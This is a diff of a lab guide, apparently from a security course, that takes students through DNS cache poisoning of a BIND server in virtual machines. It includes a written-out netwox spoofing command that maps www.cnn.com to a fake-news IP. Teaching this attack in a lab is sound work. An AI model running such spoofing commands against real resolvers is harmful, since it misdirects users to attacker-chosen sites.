@@ -18,13 +18,13 @@ The following is the IP addresses and MAC addresses for the VMs used in this REA
 
 ### Steps
 
-1. On DNS Server machine: start the DNS Server. We will use BIND software. (BIND: Berkeley Internet Name Domain) 
+1. on DNS Server machine: start the DNS Server. We will use BIND software. (BIND: Berkeley Internet Name Domain) 
 
 ```console
 # sudo service bind9 start (If it's already running, then # sudo service bind9 restart)
 ```
 
-2. On DNS Server: remove existing cache:
+2. on DNS Server: remove existing cache:
 
 ```console
 # sudo rndc flush
@@ -34,7 +34,7 @@ this screenshot shows the commands to start the server and flush the cache.
 
 ![alt text](lab-dns-start-server.png "start server and flush cache")
 
-3. On Victim Client, configure DNS server information, i.e., let the client know the IP address of the DNS server.
+3. on victim client, configure DNS server information, i.e., let the client know the IP address of the DNS server.
 
 3.1. add this line to the end of file /etc/resolvconf/resolv.conf.d/head (remember to replace DNS_SERVER_IP with your Victim DNS server's IP address, plus, you need "sudo" if you edit the file using vi/vim.)
 
@@ -54,7 +54,7 @@ nameserver DNS_SERVER_IP
 
 ![alt text](lab-dns-resolvconf.png "resolvconf command")
 
-4. On Attacker VM, run
+4. on attacker VM, run
 
 ```console
 # sudo netwox 105 --hostname "www.cnn.com" --hostnameip FAKENEWS.com_IP --authns "ns1.fastly.net" --authnsip ATTACKER_IP --filter "src host DNS_SERVER_IP" --ttl 19000 --spoofip raw
@@ -62,7 +62,7 @@ nameserver DNS_SERVER_IP
 
 FAKENEWS.com IP address (as of today, 05/24/2022): 188.126.71.216 (you can use ping command to confirm it)
 
-Explanation: '--spoofip raw' means to spoof at IP4/IP6 level, as opposed to spoof at the data link layer. In other words, spoof IP addresses, instead of spoof MAC addresses.
+**Explanation**: '--spoofip raw' means to spoof at IP4/IP6 level, as opposed to spoof at the data link layer. In other words, spoof IP addresses, instead of spoof MAC addresses.
 
 this screenshot shows the actual command:
 
@@ -72,7 +72,7 @@ Question: why it's "src host DNS_SERVER_IP", instead of "src host DNS_CLIENT_IP"
 
 Question: does the ttl here have the same meaning as the ttl in IP headers?
 
-5. on Victim Client, send a query.
+5. on victim client, send a query.
 
 ```console
 # dig www.cnn.com 
@@ -82,8 +82,8 @@ these two screenshots show the attack is successful: www.cnn.com is mapped to 18
 ![alt text](lab-dns-attack-success-p1.png "attack success")
 ![alt text](lab-dns-attack-success-p2.png "attack success")
 
-6. Stop the attack - press control-c on the Attacker VM's terminal. On Victim Client, open wireshark and repeat step 5 (i.e. run the dig command again), from the packets captured in wireshark, confirm the attack is still successful, and the forged response is indeed from the Victim DNS server.
+6. stop the attack - press control-c on the Attacker VM's terminal. On Victim Client, run the dig command again and see cnn is still mapped to the IP address of fakenews.com, which proves that the cache is indeed poisoned.
 
 ![alt text](lab-dns-attack-success-after-ctrl-c.png "attack still success")
 
-7. You are recommended to remove the line you added in step 3, in this file: /etc/resolvconf/resolv.conf.d/head, so that your future experiments won't be affected.
+7. you are recommended to remove the line you added in step 3, in this file: /etc/resolvconf/resolv.conf.d/head, so that your future experiments won't be affected.
